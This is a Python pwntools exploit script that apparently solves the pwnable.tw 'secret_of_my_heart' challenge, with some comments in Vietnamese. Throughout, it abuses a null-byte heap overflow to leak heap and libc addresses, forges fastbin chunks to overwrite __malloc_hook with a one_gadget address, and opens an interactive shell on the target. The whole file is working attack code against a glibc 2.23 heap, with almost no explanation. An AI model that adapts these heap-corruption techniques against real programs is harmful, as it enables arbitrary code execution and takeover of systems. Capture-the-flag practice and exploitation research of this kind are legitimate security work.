#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./secret_of_my_heart_patched', checksec=False)
libc = ELF('./libc_64.so.6', checksec=False)
ld = ELF('./ld-2.23.so', checksec=False)

def GDB(): #turn on NOALSR
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                # b*__libc_start_main+238
                # b*0x5555554011ac
                # b*0x555555400e20
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chall.pwnable.tw',10302)
else:
        p = process(exe.path)

GDB()

def add(size,name,secret):
        sla(b'choice :',b'1')
        sla(b':', str(size))
        sa(b':', name)
        sa(b':',secret)

def show(idx):
        sla(b'choice :',b'2')
        sla(b'Index :',str(idx))

def delete(idx):
        sla(b'choice :',b'3')
        sla(b'Index :',str(idx))

def hidden():
        sla(b'choice :',b'4869')

add(0x60,b'A'*0x20,b'aaaa') #idx=0
show(0)
p.recvuntil(b'A'*0x20)
heap = u64(p.recv(6) + b'\0\0')
info('heap leak: ' + hex(heap))
delete(0) #free0

add(0x68,b'aaaa',b'aaaa') #idx=0 #a
add(0x100,b'bbbb',b'bbbb') #idx=1 #b

add(0x100,b'eeee',b'eeee') #idx=2 #c
add(0x100,b'cccc',b'cccc') #idx=3 #barier dissappear in chunks
add(0x100,b'dddd',b'dddd') #idx=4 #advoid consolidate with top_chunk #still disappear

delete(1) #free1 #free_b #ubin 0x110
delete(2) #free2 #free_c #ubin consolidate 0x220
delete(0) #free0 #free_a #fastbin

add(0x68,b'BBBB',b'/bin/sh\0'.ljust(0x68,b'b')) #idx=0 #poison_null!!!
#size 0x111 placed idx2 was 4190
#need malloc total 0x100
#devided into 0xb0 0x10 0x10 (include metadata 0x10 * 3)
add(0xb0,b'CCCC',b'CCCC') #idx=1 
add(0x10,b'DDDD',b'DDDD') #idx=2
add(0x10,b'EEEE',b'EEEE') #idx=3_fake #4180
add(0x80,b'FFFF',b'FFFF') #idx=5 #just avoid consolidate
delete(1) #free1
delete(3) #free_old_idx3 #free_barrier #ubin consolidate 0x330
# this free will consolidate old_idx_3 42a0 which have prev_size is 0x220

# from now display old_idx_4 in heap_chunk

#next malloc will contain main_area in chunk
add(0xd0,b'GGGG',b'GGGG') #size doesn't matter #idx=6
show(5)

p.recvuntil(b'Secret : ')
libc_leak = u64(p.recv(6)+b'\0\0')
libc.address = libc_leak - 0x3c3b78
info('libc leak: ' + hex(libc_leak))
info('libc base: ' + hex(libc.address))

delete(2) #free2

add(0x40,b'aaaa',b'aaaa')
add(0xf0,b'bbbb',b'bbbb')
add(0xf0,b'cccc',b'cccc')
add(0x60,b'cccc',b'cccc')

add(0x40,b'aaaa',b'aaaa') # để poison chunk phía sau # 9
add(0xf0,b'bbbb',b'bbbb') # 10
add(0x100,b'cccc',b'a')   # 11
add(0x80,b'cccc',b'cccc') #
add(0x80,b'cccc',b'cccc') # ngăn bị gộp với topchunk

delete(9)
delete(10)
delete(11)

add(0x48,b'AAAA',b'\0'*0x48)
add(0x80,b'BBBB',b'11111111') #tách chunk
add(0xf8,b'BBBB',b'22222222')


delete(10)
delete(12)

add(0xf8,b'DDDD',b'a'*0x80 + p64(0) + p64(0x71) + b'a'*0x60 + p64(0) + p64(0x101)) # 10 ow size chunk 11
add(0x30, b'a', b'a')     #12 ngăn bị gộp 
delete(11)
delete(10)

malloc_hook = libc.sym['__malloc_hook']
fake_chunk = malloc_hook - 35
payload = b'a'*0x80 #41b0
payload += p64(0) + p64(0x71)
payload += p64(fake_chunk) #4210

add(0xf8,b'DDDD',payload)
add(0x68,b'FFFF',b'a')
one_gadget = [0x45216, 0x4526a, 0xef6c4, 0xf0567]

add(0x68,b'EEEE',b"\0"*(19) + p64(libc.address + one_gadget[2]))
delete(2)
delete(5)
p.interactive()